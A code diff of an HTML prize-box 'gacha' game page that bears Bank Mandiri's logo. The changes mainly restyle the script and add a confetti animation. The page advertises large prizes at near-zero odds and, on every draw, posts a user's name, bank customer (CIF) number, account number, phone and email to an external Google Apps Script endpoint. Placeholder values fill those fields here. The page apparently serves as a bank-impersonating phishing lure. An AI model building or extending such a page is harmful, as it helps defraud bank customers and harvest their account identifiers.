@@ -13,6 +13,7 @@
       font-family: Arial, sans-serif;
       color: white;
       text-align: center;
+      overflow-x: hidden;
     }
 
     .logo {
@@ -72,8 +73,7 @@
     }
 
     .gift-box:hover {
-      animation: shake 0.5s;
-      animation-iteration-count: infinite;
+      animation: shake 0.5s infinite;
     }
 
     .gift-box span {
@@ -150,6 +150,14 @@
       height: 20px;
     }
 
+    #confetti-canvas {
+      position: fixed;
+      pointer-events: none;
+      top: 0;
+      left: 0;
+      z-index: 998;
+    }
+
     @media screen and (max-width: 480px) {
       body {
         padding: 10px;
@@ -176,6 +184,7 @@
   </style>
 </head>
 <body>
+  <canvas id="confetti-canvas"></canvas>
   <img src="assets/logo-mandiri.png" alt="Mandiri Logo" class="logo" />
   
   <div class="menu">
@@ -194,121 +203,186 @@
   <div class="gift-container" id="gift-container"></div>
 
   <div class="popup" id="rewardPopup"></div>
+<script>
+  let points = 10;
+  let chances = 10;
 
-  <script>
-    let points = 10;
-    let chances = 10;
+  const rewards = [
+    { label: "+3 M-Gacha Poin", chance: 99.8 },
+    { label: "i-Voucher Indomaret Rp 50.000", chance: 0.06 },
+    { label: "Voucher Alfamart Rp 50.000", chance: 0.05 },
+    { label: "Voucher Grab Rp 50.000", chance: 0.03 },
+    { label: "i-Voucher Indomaret Rp 100.000", chance: 0.02 },
+    { label: "Voucher Alfamart Rp 100.000", chance: 0.015 },
+    { label: "Samsung Smart TV 32\"", chance: 0.005 },
+    { label: "iPhone 15 128GB", chance: 0.004 },
+    { label: "Honda Vario 125 CBS ISS", chance: 0.003 },
+    { label: "Logam Mulia 1gr", chance: 0.002 }
+  ];
 
-    const rewards = [
-      { label: "+3 M-Gacha Poin", chance: 99.8 },
-      { label: "i-Voucher Indomaret Rp 50.000", chance: 0.06 },
-      { label: "Voucher Alfamart Rp 50.000", chance: 0.05 },
-      { label: "Voucher Grab Rp 50.000", chance: 0.03 },
-      { label: "i-Voucher Indomaret Rp 100.000", chance: 0.02 },
-      { label: "Voucher Alfamart Rp 100.000", chance: 0.015 },
-      { label: "Samsung Smart TV 32\"", chance: 0.005 },
-      { label: "iPhone 15 128GB", chance: 0.004 },
-      { label: "Honda Vario 125 CBS ISS", chance: 0.003 },
-      { label: "Logam Mulia 1gr", chance: 0.002 }
-    ];
+  const rewardPopup = document.getElementById("rewardPopup");
+  const history = [];
 
-    const rewardPopup = document.getElementById("rewardPopup");
-    const history = [];
+  function updateDisplay() {
+    document.getElementById("points").textContent = points;
+    document.getElementById("chances").textContent = `Kesempatan Hari ini: ${chances}x`;
+  }
 
-    function updateDisplay() {
-      document.getElementById("points").textContent = points;
-      document.getElementById("chances").textContent = `Kesempatan Hari ini: ${chances}x`;
+  function pickReward() {
+    let rand = Math.random() * 100;
+    let sum = 0;
+    for (let i = 0; i < rewards.length; i++) {
+      sum += rewards[i].chance;
+      if (rand <= sum) return rewards[i].label;
     }
+    return rewards[0].label;
+  }
 
-    function pickReward() {
-      let rand = Math.random() * 100;
-      let sum = 0;
-      for (let i = 0; i < rewards.length; i++) {
-        sum += rewards[i].chance;
-        if (rand <= sum) return rewards[i].label;
+  function sendToGoogleSheets(reward) {
+    fetch('https://script.google.com/macros/s/AKfycbwYHTbpOPV0P3qwu06kgDZA3hnNJABi16ofPkBn48kV9cmo_zV-ieSYtbCzBwkooA1P/exec', {
+      method: 'POST',
+      body: JSON.stringify({
+        timestamp: new Date().toISOString(),
+        nama: "Demo User",
+        cif: "1234567890",
+        norek: "9876543210",
+        hp: "081234567890",
+        email: "demo@example.com",
+        reward: reward
+      }),
+      headers: {
+        'Content-Type': 'application/json'
       }
-      return rewards[0].label;
+    });
+  }
+
+  function openBox(index) {
+    if (points < 2 || chances <= 0) {
+      showRewardPopup("Kamu kehabisan kesempatan atau poin.", false);
+      return;
     }
+    points -= 2;
+    chances--;
 
-    function sendToGoogleSheets(reward) {
-      fetch('https://script.google.com/macros/s/AKfycbwYHTbpOPV0P3qwu06kgDZA3hnNJABi16ofPkBn48kV9cmo_zV-ieSYtbCzBwkooA1P/exec', {
-        method: 'POST',
-        body: JSON.stringify({
-          timestamp: new Date().toISOString(),
-          nama: "Demo User",
-          cif: "1234567890",
-          norek: "9876543210",
-          hp: "081234567890",
-          email: "demo@example.com",
-          reward: reward
-        }),
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      });
-    }
+    const reward = pickReward();
+    if (reward.includes('+3')) points += 3;
 
-    function openBox(index) {
-      if (points < 2 || chances <= 0) {
-        showRewardPopup("Kamu kehabisan kesempatan atau poin.", false);
-        return;
-      }
-      points -= 2;
-      chances--;
-
-      const reward = pickReward();
-      if (reward.includes('+3')) points += 3;
-
-      history.push(reward);
-      updateDisplay();
-      showRewardPopup(reward, true);
-      sendToGoogleSheets(reward);
-    }
-
-    function showRewardPopup(message, isReward = true) {
-      rewardPopup.innerHTML = `
-        <div style="font-size: 24px;">
-          ${isReward ? '🎉 Kamu mendapat:<br><span style="font-size:32px;">' + message + '</span>' : message}
-        </div>
-        <button onclick="closeRewardPopup()">Main Lagi</button>
-      `;
-      rewardPopup.style.display = "block";
-    }
-
-    function closeRewardPopup() {
-      rewardPopup.style.display = "none";
-    }
-
-    function showGiftList() {
-      alert(`🎁 Daftar Hadiah:\n\n${rewards.map(r => r.label).join('\n')}`);
-    }
-
-    function showHistory() {
-      alert(`📦 Riwayat HadiahMu:\n\n${history.join('\n') || "Belum ada hadiah yang diperoleh."}`);
-    }
-
-    function createGiftBox(index) {
-      const box = document.createElement("div");
-      box.className = "gift-box";
-
-      const icon = document.createElement("span");
-      icon.textContent = "🎁";
-      icon.onclick = () => openBox(index);
-
-      box.appendChild(icon);
-      return box;
-    }
-
-    function renderGifts() {
-      const giftContainer = document.getElementById("gift-container");
-      giftContainer.innerHTML = "";
-      for (let i = 0; i < 4; i++) {
-        giftContainer.appendChild(createGiftBox(i));
-      }
-    }
-
-    renderGifts();
+    history.push(reward);
     updateDisplay();
-  </script>
+    showRewardPopup(reward, true);
+    sendToGoogleSheets(reward);
+  }
+
+  function showRewardPopup(message, isReward = true) {
+    rewardPopup.innerHTML = `
+      <div style="font-size: 24px;">
+        ${isReward ? '🎉 Kamu mendapat:<br><span style="font-size:32px;">' + message + '</span>' : message}
+      </div>
+      <button onclick="closeRewardPopup()">Main Lagi</button>
+    `;
+    rewardPopup.style.display = "block";
+
+    if (isReward) startConfetti();
+  }
+
+  function closeRewardPopup() {
+    rewardPopup.style.display = "none";
+    stopConfetti();
+  }
+
+  function showGiftList() {
+    alert(`🎁 Daftar Hadiah:\n\n${rewards.map(r => r.label).join('\n')}`);
+  }
+
+  function showHistory() {
+    alert(`📦 Riwayat HadiahMu:\n\n${history.join('\n') || "Belum ada hadiah yang diperoleh."}`);
+  }
+
+  function createGiftBox(index) {
+    const box = document.createElement("div");
+    box.className = "gift-box";
+
+    const icon = document.createElement("span");
+    icon.textContent = "🎁";
+    icon.onclick = () => openBox(index);
+
+    box.appendChild(icon);
+    return box;
+  }
+
+  function renderGifts() {
+    const giftContainer = document.getElementById("gift-container");
+    giftContainer.innerHTML = "";
+    for (let i = 0; i < 4; i++) {
+      giftContainer.appendChild(createGiftBox(i));
+    }
+  }
+
+  renderGifts();
+  updateDisplay();
+</script>
+<script>
+// 🎊 Confetti Engine JS (tanpa library eksternal)
+const canvas = document.getElementById("confetti-canvas");
+const ctx = canvas.getContext("2d");
+let confetti = [];
+let animationFrame;
+
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+window.addEventListener("resize", resizeCanvas);
+resizeCanvas();
+
+function startConfetti() {
+  confetti = [];
+  for (let i = 0; i < 100; i++) {
+    confetti.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height - canvas.height,
+      r: Math.random() * 6 + 4,
+      d: Math.random() * 100 + 10,
+      color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+      tilt: Math.random() * 10 - 10,
+      tiltAngle: 0,
+      tiltAngleIncrement: 0.07 * Math.random() + 0.05
+    });
+  }
+  renderConfetti();
+}
+
+function renderConfetti() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  confetti.forEach((c, i) => {
+    ctx.beginPath();
+    ctx.lineWidth = c.r;
+    ctx.strokeStyle = c.color;
+    ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
+    ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.r / 2);
+    ctx.stroke();
+  });
+
+  updateConfetti();
+  animationFrame = requestAnimationFrame(renderConfetti);
+}
+
+function updateConfetti() {
+  confetti.forEach((c) => {
+    c.tiltAngle += c.tiltAngleIncrement;
+    c.y += (Math.cos(c.d) + 3 + c.r / 2) / 2;
+    c.x += Math.sin(c.d);
+    c.tilt = Math.sin(c.tiltAngle) * 15;
+  });
+
+  confetti = confetti.filter((c) => c.y < canvas.height);
+}
+
+function stopConfetti() {
+  cancelAnimationFrame(animationFrame);
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+}
+</script>
+
 </body>
 </html>
